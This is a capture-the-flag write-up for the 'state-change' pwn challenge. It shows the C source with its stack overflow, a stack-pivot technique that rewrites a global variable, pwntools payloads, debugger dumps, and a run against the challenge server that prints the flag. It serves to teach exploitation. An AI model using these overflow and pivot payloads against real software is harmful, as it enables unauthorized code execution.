# state-change

pwn/state-change
asdiml
146 solves / 311 points

Changes in state are like rustlings in the wind

`nc chall.lac.tf 31593`

## Vulnerability
Here is the source code of the challenge:
```c
#include <stdio.h>
#include <string.h>

char buf[0x500]; // Wow so useful
int state;
char errorMsg[0x70];

void win() {
    char filebuf[64];
    strcpy(filebuf, "./flag.txt");
    FILE* flagfile = fopen("flag.txt", "r");

    /* ********** ********** */
    // Note this condition in win()
    if(state != 0xf1eeee2d) {
        puts("\ntoo ded to gib you the flag");
        exit(1);
    }
    /* ********** ********** */
    
    if (flagfile == NULL) {
        puts(errorMsg);
    } else {
        char buf[256];
        fgets(buf, 256, flagfile);
        buf[strcspn(buf, "\n")] = '\0';
        puts("Here's the flag: ");
        puts(buf);
    }
}

void vuln(){
    char local_buf[0x20];
    puts("Hey there, I'm deaddead. Who are you?");
    fgets(local_buf, 0x30, stdin);
}

int main(){

    state = 0xdeaddead;
    strcpy(errorMsg, "Couldn't read flag file. Either create a test flag.txt locally and try connecting to the server to run instead.");

    setbuf(stdin, 0);
	setbuf(stdout, 0);

    vuln();
    
    return 0;
}
```
The vulnerability is obvious:
```c
void vuln(){
    char local_buf[0x20];
    puts("Hey there, I'm deaddead. Who are you?");
    fgets(local_buf, 0x30, stdin);
}
```
There's 0x10 bytes of overflow in the function `vuln()`, which means we can overflow the stack and overwrite `old rbp` as well as the return address of the function `vuln()`.  

## Solution
A no-brainer return option would be `win()` because in that function we get the flag. However, there's one more thing to do before that, which is changing the global variable `state` from `0xdeaddead` to `0xf1eeee2d` because of the following protection:
```c
    if(state != 0xf1eeee2d) {
        puts("\ntoo ded to gib you the flag");
        exit(1);
    }
```


> changing the global variable `state` from `0xdeaddead` to `0xf1eeee2d`

To achieve this, we can return to `fgets` to write `state` to `0xf1eeee2d`. More specifically, setting the address of `state` to be the destination buffer of `fgets`, then send `0xf1eeee2d`, just like the following:
```
 ► 0x4012e3 <vuln+46>    call   fgets@plt                   <fgets@plt>
        s: 0x404530 (buf+1264) ◂— 0
        n: 0x30
        stream: 0x7f8f8e8438e0 (_IO_2_1_stdin_) ◂— 0xfbad208b

```
So...how can we do it?  
The trick is to overwrite `old rbp` to `address of state+0x20` before returning to `fgets`, because the destination buffer is loaded from `rbp-0x20`, `state` + 0x20 - 0x20 becomes the address of state!
```
 ► 0x4012d7 <vuln+34>    lea    rax, [rbp - 0x20]                 RAX => 0x404540 (state) ◂— 0xdeaddead
```
Then, after the `fgets` function finishes, we can see that `state` and its surrounding data indeed got overwritten
```
pwndbg> tele 0x404540
00:0000│ rax rcx 0x404540 (state) ◂— 0xf1eeee2d00
01:0008│-018     0x404548 ◂— 0x4242424242424200
02:0010│-010     0x404550 ◂— 0x4242424242424242 ('BBBBBBBB')
... ↓            2 skipped
05:0028│+008     0x404568 (errorMsg+8) ◂— 0x4011d642
```
But unfortunately there's a null-byte somehow, that corrupts the desired value. I am not sure where does the null-byte come from, it might have been due to my specific payload:
```py
payload = flat(
	b'A' * 0x20,
	p64(0x404560), # rbp
	p64(0x4012d0)
)
payload2 = flat(
	p64(0xf1eeee2d),
	b'B'* 0x20,
	p64(0x4011d6)
)
p.send(payload)
p.send(payload2)
```
Or just because that's a newline character added and changed to null byte  

Anyway, what I did to avoid that was to modify my second payload to become the following:
```py
payload = flat(
	b'A' * 0x20,
	p64(0x404550), # rbp
	p64(0x00000000004012d0)
)
payload2 = flat(
	b'A'* (0x10 - 1),
	p64(0xf1eeee2d),
	b'B'* 0x10,
	p64(0x00000000004011d6)
)
```
I set `old rbp` to be `state+0x10`, then the destination buffer of fgets become `state-0x10`, then I send `0x10 - 1` bytes (where the -1 byte reserve a space for the null-byte) to pad up to where `state` locates. Finally, overwrite it with `0xf1eeee2d` and set the `rbp-0x8` aka return address to starting address of `win()`, that solves the problem!
```
pwndbg> tele 0x404530
00:0000│ rax rcx 0x404530 (buf+1264) ◂— 0x4141414141414100
01:0008│-018     0x404538 (buf+1272) ◂— 0x4141414141414141 ('AAAAAAAA')
02:0010│-010     0x404540 (state) ◂— 0xf1eeee2d
03:0018│-008     0x404548 ◂— 0x4242424242424242 ('BBBBBBBB')
04:0020│ rbp     0x404550 ◂— 0x4242424242424242 ('BBBBBBBB')
05:0028│+008     0x404558 —▸ 0x4011d6 (win) ◂— endbr64
```
## flag
```
└─$ python solve.py 
[+] Starting local process './chall': pid 914328
[+] Opening connection to chall.lac.tf on port 31593: Done
[*] Switching to interactive mode
Here's the flag: 
lactf{1s_tHi5_y0Ur_1St_3vER_p1VooT}
[*] Got EOF while reading in interactive
```
